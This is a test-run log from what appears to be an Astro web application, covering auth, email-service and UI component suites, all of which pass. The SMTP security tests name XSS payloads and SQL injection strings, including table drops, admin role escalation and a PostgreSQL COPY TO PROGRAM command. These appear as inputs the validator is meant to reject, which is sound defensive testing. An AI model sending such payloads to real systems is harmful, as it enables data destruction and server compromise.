[90mstdout[2m | tests/integration/auth-flow.test.ts[2m > [22m[2mAuth ÔÇö critical integration tests[2m > [22m[2msign-up creates user and audit log
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜí´©Å secrets for agents: https://dotenvx.com/as2

[90mstdout[2m | tests/pages/public-pages.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/pages/public-pages.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/pages/public-pages.test.ts [2m([22m[2m62 tests[22m[2m)[22m[33m 16504[2mms[22m[39m
[90mstdout[2m | tests/integration/auth-flow.test.ts[2m > [22m[2mAuth ÔÇö critical integration tests[2m > [22m[2msign-up creates user and audit log
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

stderr | tests/integration/auth-flow.test.ts > Auth ÔÇö critical integration tests > sign-in with invalid password is rejected
2026-03-08T19:27:09.264Z ERROR [Better Auth]: Credential account not found { email: 'test-h2qaltqe@example.com' }

[90mstdout[2m | tests/integration/auth-flow.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/auth-flow.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/auth-flow.test.ts [2m([22m[2m4 tests[22m[2m)[22m[33m 19234[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m sign-up creates user and audit log [33m 6310[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m sign-in with invalid password is rejected [33m 779[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m duplicate sign-up is rejected or returns error [33m 681[2mms[22m[39m
[90mstdout[2m | tests/integration/org-admin.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/smtp.test.ts
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:27:21[22m [34m[types][39m Generated [2m62ms[22m
[2m20:27:21[22m [33m[302][39m / [2m1ms[22m
[2m20:27:21[22m [34m[200][39m /fr/ [2m27ms[22m
[90mstdout[2m | tests/integration/org-admin.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[2m20:27:23[22m [33m[302][39m / [2m1ms[22m
[2m20:27:23[22m [34m[200][39m /fr/ [2m28ms[22m
[90mstdout[2m | tests/unit/smtp.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send valid email
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with HTML
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[2m20:27:24[22m [34m[types][39m Generated [2m23ms[22m
[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with custom from
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBasic Email Sending[2m > [22m[2mshould send email with replyTo
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid recipient email
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid sender email
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould require subject
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould require content (text or html)
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject subject longer than 998 chars
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: not-an-email
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: @example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: user@
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: user@@example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: user @example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: user@example
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould reject invalid email: 
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mEmail Validation[2m > [22m[2mshould accept valid email: user@example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: "<script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: '-alert(1)-'
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <img src=x onerror=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: javascript:alert(1)
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: ${alert(1)}
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: {{constructor.constructor("alert(1)")()}}
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <iframe src="javascript:alert(1)"></iframe>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <body onload=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/components/Button/Button.test.ts[2m > [22m[2mui/Button[2m > [22m[2mfinal: no memory leaks during batch rendering
[22m[39mÔ£ô Rendered 500 buttons in 949.79ms

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <input onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <select onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <textarea onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <marquee onstart=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in subject: <div style="background:url(javascript:alert(1))">
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: "<script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: '-alert(1)-'
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <img src=x onerror=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: javascript:alert(1)
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: ${alert(1)}
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: {{constructor.constructor("alert(1)")()}}
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <iframe src="javascript:alert(1)"></iframe>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <body onload=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <input onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <select onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <textarea onfocus=alert(1) autofocus>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <marquee onstart=alert(1)>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - XSS Protection[2m > [22m[2mshould handle XSS payload in body: <div style="background:url(javascript:alert(1))">
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: '; DROP TABLE user; --
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: ' OR '1'='1
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: '; DELETE FROM user WHERE '1'='1'; --
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: 1'; UPDATE user SET role='admin' WHERE '1'='1
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: ' UNION SELECT * FROM pg_authid --
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: '; COPY (SELECT '') TO PROGRAM 'id'; --
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: admin'--
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/integration/org-admin.test.ts[2m > [22m[2mOrg Admin tests
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ­ƒøí´©Å auth for agents: https://vestauth.com

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: ' or 1=1--
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - SQL Injection[2m > [22m[2mshould reject SQL injection in email: ') OR ('1'='1
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - Null Bytes[2m > [22m[2mshould reject null bytes: test <script>alert(1)</script>
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - Null Bytes[2m > [22m[2mshould reject null bytes: admin .php
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mSecurity - Null Bytes[2m > [22m[2mshould accept valid email without null byte: user@example.com
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould send batch emails
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould batch with custom concurrency
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mBatch Operations[2m > [22m[2mshould handle mixed valid and invalid emails in batch
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mConnection Management[2m > [22m[2mshould verify connection
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mConnection Management[2m > [22m[2mshould close connection
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mConnection Management[2m > [22m[2mshould return config
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mError Handling[2m > [22m[2mshould handle timeout gracefully
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts[2m > [22m[2mSmtpService Unit Tests[2m > [22m[2mError Handling[2m > [22m[2mshould classify auth errors
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/unit/smtp.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/smtp.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/smtp.test.ts [2m([22m[2m65 tests[22m[2m)[22m[33m 16962[2mms[22m[39m
[90mstdout[2m | tests/integration/org-admin.test.ts[2m > [22m[2mOrg Admin tests
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/integration/org-admin.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/org-admin.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/org-admin.test.ts [2m([22m[2m17 tests[22m[2m)[22m[33m 22209[2mms[22m[39m
[90mstdout[2m | tests/integration/comments.test.ts
[22m[39m[dotenv@17.3.1] injecting env (0) from .env -- tip: ÔÜÖ´©Å  specify custom .env file path with { path: '/custom/path/.env' }

[90mstdout[2m | tests/integration/comments.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/ProgressBar/ProgressBar.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:27:44[22m [33m[302][39m / [2m1ms[22m
[2m20:27:44[22m [34m[200][39m /fr/ [2m35ms[22m
[90mstdout[2m | tests/integration/comments.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[90mstdout[2m | tests/integration/comments.test.ts[2m > [22m[2mComments actions (createComment)
[22m[39m[SMTP] Mode MOCK activ├® - pas de vrais emails envoy├®s

[90mstdout[2m | tests/integration/comments.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/integration/comments.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/integration/comments.test.ts [2m([22m[2m3 tests[22m[2m)[22m[33m 14535[2mms[22m[39m
[2m20:27:50[22m [33m[302][39m / [2m1ms[22m
[2m20:27:50[22m [34m[200][39m /fr/ [2m36ms[22m
[90mstdout[2m | tests/unit/components/ProgressBar/ProgressBar.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[90mstdout[2m | tests/unit/components/ProgressBar/ProgressBar.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/ProgressBar/ProgressBar.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/ProgressBar/ProgressBar.test.ts [2m([22m[2m14 tests[22m[2m)[22m[33m 13115[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders with correct percentage [33m 405[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Tabs/Tabs.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Dropdown/Dropdown.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:28:04[22m [33m[302][39m / [2m1ms[22m
[2m20:28:04[22m [34m[200][39m /fr/ [2m33ms[22m
[90mstdout[2m | tests/unit/components/Tabs/Tabs.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[2m20:28:06[22m [34m[types][39m Generated [2m48ms[22m
[90mstdout[2m | tests/unit/components/Tabs/Tabs.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Tabs/Tabs.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Tabs/Tabs.test.ts [2m([22m[2m10 tests[22m[2m)[22m[33m 12555[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders container with correct class [33m 307[2mms[22m[39m
[2m20:28:07[22m [33m[302][39m / [2m1ms[22m
[2m20:28:07[22m [34m[200][39m /fr/ [2m32ms[22m
[90mstdout[2m | tests/unit/components/Dropdown/Dropdown.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4322/api/auth

[90mstdout[2m | tests/unit/components/Dropdown/Dropdown.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Dropdown/Dropdown.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Dropdown/Dropdown.test.ts [2m([22m[2m11 tests[22m[2m)[22m[33m 13282[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders dropdown container [33m 486[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m applies variant class [33m 323[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Form/Form.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Button/Button.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Button/Button.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Button/Button.test.ts [2m([22m[2m137 tests[22m[2m)[22m[33m 320572[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m axe-core: accessible with default content [33m 1732[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m axe-core: accessible with icon [33m 885[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m playwright: renders text, is clickable, respects disabled [33m 32373[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m playwright: icon rendered and positioned correctly [33m 3048[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m playwright: disabled button cannot be clicked [33m 2868[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m pa11y: accessible default button [33m 2320[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m lighthouse: default button [33m 12498[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m stress: renders 1000 buttons without performance degradation [33m 1424[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m interactive: button click events work with Playwright [33m 38502[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m interactive: disabled button is not clickable [33m 8880[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m focus: button is focusable [33m 2338[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m focus: disabled button is not focusable [33m 27315[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m focus: tab order is correct with multiple buttons [33m 26491[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m keyboard: Enter key activates button [33m 13099[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m keyboard: Space key activates button [33m 1933[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m keyboard: Escape key does not affect button [33m 2212[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m performance: renders 1000 buttons sequentially with acceptable time [33m 939[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m integration-pw: full button workflow with Playwright [33m 36388[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m integration-pw: button with icon workflow [33m 29014[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m final: accessibility audit passes [33m 611[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m final: no console errors or warnings during render [33m 437[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m final: no memory leaks during batch rendering [33m 1035[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Table/Table.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[90mstdout[2m | tests/unit/components/Card/Card.test.ts
[22m[39m
­ƒº¬ Starting test suite...


[2m20:28:30[22m [34m[types][39m Generated [2m3ms[22m
[2m20:28:35[22m [34m[types][39m Generated [2m46ms[22m
[2m20:28:39[22m [34m[types][39m Generated [2m13ms[22m
stderr | tests/unit/components/Form/Form.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Form/Form.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

stderr | tests/unit/components/Table/Table.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Table/Table.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

stderr | tests/unit/components/Card/Card.test.ts
Unable to detect dev server port, falling back to 4321

[90mstdout[2m | tests/unit/components/Card/Card.test.ts
[22m[39mÔ£à test base URL set to http://localhost:4321/api/auth

[90mstdout[2m | tests/unit/components/Table/Table.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Table/Table.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Form/Form.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Table/Table.test.ts [2m([22m[2m7 tests[22m[2m)[22m[33m 29320[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders table container with default classes [33m 665[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m applies variant class [33m 541[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m does not apply striped class when striped=false [33m 410[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Form/Form.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Form/Form.test.ts [2m([22m[2m13 tests[22m[2m)[22m[33m 32205[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders with form-group class [33m 601[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders with correct type [33m 498[2mms[22m[39m
[90mstdout[2m | tests/unit/components/Card/Card.test.ts
[22m[39m
Ô£à Test suite complete


[90mstdout[2m | tests/unit/components/Card/Card.test.ts
[22m[39m
Ô£à Test suite complete


 [32mÔ£ô[39m tests/unit/components/Card/Card.test.ts [2m([22m[2m9 tests[22m[2m)[22m[33m 26707[2mms[22m[39m
     [33m[2mÔ£ô[22m[39m renders as article element [33m 1018[2mms[22m[39m
